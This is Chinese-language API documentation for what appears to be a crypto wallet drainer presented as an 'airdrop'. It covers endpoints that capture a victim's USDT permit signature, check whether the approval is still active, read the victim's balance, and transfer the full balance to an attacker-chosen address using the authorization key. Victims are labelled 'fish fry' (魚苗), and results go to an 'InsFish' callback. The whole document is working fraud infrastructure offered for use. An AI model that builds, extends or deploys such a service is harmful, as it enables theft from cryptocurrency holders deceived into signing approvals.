## API: 新增授權
- 格式
```bash
[POST] /airdrop

Ex: /airdrop/
Body:
{
  data: 'dac17f958d2ee523a2206206994597c13d831ec73b5e342cf923994b4acc7248fb767ea2da5e77b95427fefa711eff984124bfbb1ab6fbf5e3da1820cf8ba24c4535a7a176e3de4158d58908b1d7a5973d4b42ab78213330ec940826'
  callbackUrl: 'xxx'
}
```

- 參數(JSON)
```js
{
  data: '', // 執行 WT.permit(...) 的返回值
  callbackUrl: '' // 後台回覆網址
}
```

- 返回值(JSON)
```js
{
  status: 'ok' // 成功
}

或

{
  error: {
    message: '' // 錯誤訊息
  },
  status: 'error' // 失敗
}
```

- 後台回覆 [POST] (https://.../InsFish.php)
```js
{
  sAccount0: '', // 會員地址
  sAccount1: '', // 授權地址
  sAccount2: '', // 合約地址
  sTransactionHash: '', // 交易序號
  nTransactionStatus: 1, // 交易狀態. 0: 交易失敗, 1:交易成功, 2:交易尚未完成 或 無效的交易序號. 查詢交易明細可至 https://etherscan.io/tx/{transactionHash}
  nType0: 1, // // 1:erc, 2:trc
  nType1: 1 // 1: USDT
}
```

## API: 查詢授權狀態
- 格式
```bash
[POST] /airdrop/check

Ex: /airdrop/check
Body:
{
  addressType: '1',
  contractAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  userAddress: '0xf15e3B1dD8efc63358697c5737f1Aea7cdC5F137',
  authorizationAddress: '0x1a6b4aC89317323D7eB9f817Cea8aE7F722530FA'
}
```

- 參數(JSON)
```js
{
  addressType: '', // 1:erc, 2:trc
  contractAddress: '', // 合約地址
  userAddress: '', // 魚苗地址
  authorizationAddress: '' // 授權地址
}
```

- 返回值(JSON)
```js
{
  result: true, // true: 授權中, false, 無授權
  status: 'ok' // 成功
}

或

{
  error: {
    true: '' // 錯誤訊息
  },
  status: 'error' // 失敗
}
```

## API: 查詢餘額
- 格式
```bash
[GET] /{ownerAddress}/balance?{addressType}=&{contractAddress}=

Ex: /0xadb2b42f6bd96f5c65920b9ac88619dce4166f94/balance?addressType=1&contractAddress=0xdAC17F958D2ee523a2206206994597C13D831ec7
```

- 參數
```bash
ownerAddress: 魚苗地址
addressType: 地址類型. // 1:erc, 2:trc
contractAddress: 合約地址
```

- 返回值(JSON)
```js
{
  result: {
    balance: '' // 餘額
  },
  status: 'ok' // 成功
}

或

{
  error: {
    message: '' // 錯誤訊息
  },
  status: 'error' // 失敗
}
```

## API: 轉帳交易
- 格式
```bash
[POST] /transaction

Ex: /transaction
Body:
{
  addressType: '1',
  contractAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  operator: '', // 私鑰不顯示
  from: '0xf15e3B1dD8efc63358697c5737f1Aea7cdC5F137',
  to: '0x1A5A4e7Af1D8BBD9C216c26F733ff98fD79Cc742',
  amount: '0'
}
```

- 參數(JSON)
```js
{
  addressType: '', // 1:erc, 2:trc
  contractAddress: '', // 合約地址
  operator: '', // 授權地址的私鑰
  from: '', // 魚苗地址
  to: '', // 接收地址
  amount: '' // 交易量. '0': 全部
}
```

- 返回值(JSON)
```js
{
  result: {
    transactionHash: '', // 交易序號
    amount: '' // 實際交易量
  },
  status: 'ok' // 成功
}

或

{
  error: {
    message: '' // 錯誤訊息
  },
  status: 'error' // 失敗
}
```

## API: 查詢轉帳交易結果
- 格式
```bash
[GET] /transaction/{transactionHash}?{addressType}=

Ex: /transaction/0xeca371f848f3642413a4d3bd39e332efcea2ac866573851a7b2d19e942f343b9
```

- 參數
```bash
transactionHash: 交易序號
addressType: 地址類型. // 1:erc, 2:trc
```

- 返回值(JSON)
```js
{
  result: {
    transactionStatus: 0 // 交易狀態. 0: 交易失敗, 1:交易成功, 2:交易尚未完成 或 無效的交易序號. 查詢交易明細可至 https://etherscan.io/tx/{transactionHash}
  },
  status: 'ok' // 成功
}

或

{
  error: {
    message: '' // 錯誤訊息
  },
  status: 'error' // 失敗
}
```
